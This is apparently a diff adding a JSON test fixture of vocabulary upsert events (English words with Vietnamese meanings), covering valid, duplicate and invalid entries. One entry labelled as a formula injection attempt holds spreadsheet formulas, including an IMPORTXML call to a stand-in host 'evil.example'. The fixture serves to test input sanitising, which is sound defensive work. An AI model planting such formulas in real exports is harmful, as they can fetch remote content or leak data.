@@ -1,0 +1,34 @@
+{
+  "valid_upsert": {
+    "event_id": "1c11d5a4-92a8-4bcc-b3fa-f03c9ce2c4b1",
+    "word": "overwhelmed",
+    "part_of_speech": "adjective",
+    "sense_key": "feeling_unable_to_cope",
+    "meaning_vi": "quá tải, choáng ngợp",
+    "example": "I feel overwhelmed by work.",
+    "source_excerpt": "What does overwhelmed mean?"
+  },
+  "duplicate_upsert": {
+    "event_id": "1c11d5a4-92a8-4bcc-b3fa-f03c9ce2c4b1",
+    "word": "overwhelmed",
+    "part_of_speech": "adjective",
+    "sense_key": "feeling_unable_to_cope",
+    "meaning_vi": "quá tải, choáng ngợp",
+    "example": "I feel overwhelmed by work.",
+    "source_excerpt": "What does overwhelmed mean?"
+  },
+  "invalid_missing_word": {
+    "event_id": "2d22e6b5-92a8-4bcc-b3fa-f03c9ce2c4b2",
+    "word": "   ",
+    "meaning_vi": "trống"
+  },
+  "formula_injection_attempt": {
+    "event_id": "3e33f7c6-92a8-4bcc-b3fa-f03c9ce2c4b3",
+    "word": "exploit",
+    "part_of_speech": "noun",
+    "sense_key": "formula_test",
+    "meaning_vi": "=IMPORTXML(\"https://evil.example\",\"//a\")",
+    "example": "+SUM(A1:A10)",
+    "source_excerpt": "What does exploit mean?"
+  }
+}
